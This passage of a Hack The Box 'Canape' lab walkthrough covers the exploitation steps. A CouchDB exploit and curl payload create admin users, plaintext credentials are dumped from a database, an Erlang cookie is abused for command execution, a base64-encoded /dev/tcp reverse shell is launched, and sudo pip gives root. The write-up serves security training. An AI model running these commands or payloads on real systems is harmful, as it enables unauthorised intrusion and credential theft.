+<div class="highlight"><pre><span></span><code>www-data@canape:/tmp$ python 44498.py -P leecybersec -u hades -p 5984 127.0.0.1
+[+] User to create: hades
+[+] Password: leecybersec
+[+] Attacking host 127.0.0.1 on port 5984
+[+] User hades with password leecybersec successfully created.
+</code></pre></div>
+<p>We also run curl with function PUT to sent the payload</p>
+<div class="highlight"><pre><span></span><code>curl -X PUT -d &#39;{&quot;type&quot;:&quot;user&quot;,&quot;name&quot;:&quot;leevn&quot;, &quot;roles&quot;:[&quot;_admin&quot;],&quot;roles&quot;:[],&quot;password&quot;:&quot;leevn&quot;}&#39; localhost:5984/_users/org.couchdb.user:leevn -H &quot;Content-Type:application/json&quot;
+{&quot;ok&quot;:true,&quot;id&quot;:&quot;org.couchdb.user:leevn&quot;,&quot;rev&quot;:&quot;1-de62ec86a122727ccc9844ab17419a37&quot;}
+</code></pre></div>
+<p>Back to database <code>passwords</code> and run query command with new admin credential</p>
+<div class="highlight"><pre><span></span><code>www-data@canape:/tmp$ curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/_all_docs
+
+{&quot;total_rows&quot;:4,&quot;offset&quot;:0,&quot;rows&quot;:[
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;2-81cf17b971d9229c54be92eeee723296&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;}},
+{&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;}}
+]}
+</code></pre></div>
+<p>Query single id and get value:</p>
+<div class="highlight"><pre><span></span><code>curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;_rev&quot;:&quot;2-81cf17b971d9229c54be92eeee723296&quot;,&quot;item&quot;:&quot;ssh&quot;,&quot;password&quot;:&quot;0B4jyA0xtytZi7esBNGp&quot;,&quot;user&quot;:&quot;&quot;}
+curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;_rev&quot;:&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;,&quot;item&quot;:&quot;couchdb&quot;,&quot;password&quot;:&quot;r3lax0Nth3C0UCH&quot;,&quot;user&quot;:&quot;couchy&quot;}
+curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc438003e5f&quot;,&quot;_rev&quot;:&quot;1-77cd0af093b96943ecb42c2e5358fe61&quot;,&quot;item&quot;:&quot;simpsonsfanclub.com&quot;,&quot;password&quot;:&quot;h02ddjdj2k2k2&quot;,&quot;user&quot;:&quot;homer&quot;}
+curl -X GET http://hades:leecybersec@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
+{&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;_rev&quot;:&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;,&quot;user&quot;:&quot;homerj0121&quot;,&quot;item&quot;:&quot;github&quot;,&quot;password&quot;:&quot;STOP STORING YOUR PASSWORDS HERE -Admin&quot;}
+</code></pre></div>
+<p>The user stored their password in database passwords and admin was warning them. Let's use knows password for SSH service.</p>
+<p>I successfully login with credential <code>homer:0B4jyA0xtytZi7esBNGp</code></p>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[1.6:45.9]~
+└─$ sshpass -p 0B4jyA0xtytZi7esBNGp ssh homer@10.10.10.70 -p 65535
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5
+homer@canape:~$ id
+uid=1000(homer) gid=1000(homer) groups=1000(homer)
+</code></pre></div>
+<h3 id="erlang-couchdb-local-privescal">Erlang CouchDB Local PrivEscal</h3>
+<p>Checking running service, I saw the command line <code>-setcookie monster</code></p>
+<div class="highlight"><pre><span></span><code>www-data@canape:/home$ ps aux | grep couchdb                    
+root        639  0.0  0.0   4240   644 ?        Ss   Apr13   0:00 runsv couchdb
+root        641  0.0  0.0   4384   676 ?        S    Apr13   0:00 svlogd -tt /var/log/couchdb
+homer       642  0.4  3.5 649344 34920 ?        Sl   Apr13   1:11 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
+www-data   1587  0.0  0.1  11284  1020 pts/0    S+   01:37   0:00 grep couchdb
+</code></pre></div>
+<p>Using cookie <code>monster</code> and go to Erlang</p>
+<div class="highlight"><pre><span></span><code>www-data@canape:/home$ HOME=/ erl -sname 0xdf -setcookie monster
+Eshell V7.3  (abort with ^G)
+(0xdf@canape)1&gt; os:cmd(&quot;id&quot;).
+&quot;uid=33(www-data) gid=33(www-data) groups=33(www-data)\n&quot;
+</code></pre></div>
+<p>Using <code>rpc module</code> of Erlang and call to CouchDB</p>
+<div class="highlight"><pre><span></span><code>(0xdf@canape)2&gt; rpc:call(&#39;couchdb@localhost&#39;, os, cmd, [whoami]).
+&quot;homer\n&quot;
+</code></pre></div>
+<p>Create homer shell</p>
+<div class="highlight"><pre><span></span><code>(0xdf@canape)3&gt; rpc:call(&#39;couchdb@localhost&#39;, os, cmd, [&quot;echo -n c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQ== | base64 -d | bash&quot;]).
+</code></pre></div>
+<p>At listener, I have reverse shell</p>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[1.0:39.5]~
+└─$ sudo nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 43496
+sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid=1000(homer) gid=1000(homer) groups=1000(homer)
+</code></pre></div>
+<h3 id="sudo-pip-command">Sudo Pip Command</h3>
+<div class="highlight"><pre><span></span><code>homer@canape:~$ sudo -l
+[sudo] password for homer: 
+&lt;snip&gt;
+
+User homer may run the following commands on canape:
+    (root) /usr/bin/pip install *
+</code></pre></div>
+<p>Server allow execute <code>/usr/bin/pip install *</code> as root without require password. Based on <a href="https://gtfobins.github.io/gtfobins/pip/#shell">GTFOBins/pip</a>, I create a root shell.</p>
+<div class="highlight"><pre><span></span><code>homer@canape:~$ TF=$(mktemp -d)                                                                                                                      
+homer@canape:~$ echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF/setup.py                                      
+homer@canape:~$ sudo /usr/bin/pip install $TF                                                                                                        
+&lt;snip&gt;                                                         
+Processing /tmp/tmp.vuft5MuGm7                                                                                                                       
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../ServMon/index.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: HTB ServMon" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              HTB ServMon
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../Help/index.html" class="md-footer__link md-footer__link--next" aria-label="Next: HTB Help" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              HTB Help
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2020 - 2021 LeeCyberSec
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+        
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://www.facebook.com/leecybersec" target="_blank" rel="noopener" title="www.facebook.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://twitter.com/leecybersec" target="_blank" rel="noopener" title="twitter.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/leecybersec" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.linkedin.com/in/leecybersec" target="_blank" rel="noopener" title="www.linkedin.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://www.youtube.com/channel/UC_2YYw_h37UiMUaPv_tB5Rw" target="_blank" rel="noopener" title="www.youtube.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.477d984a.min.js", "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.82b56eb2.min.js"></script>
+      
+    
+  </body>
+</html>
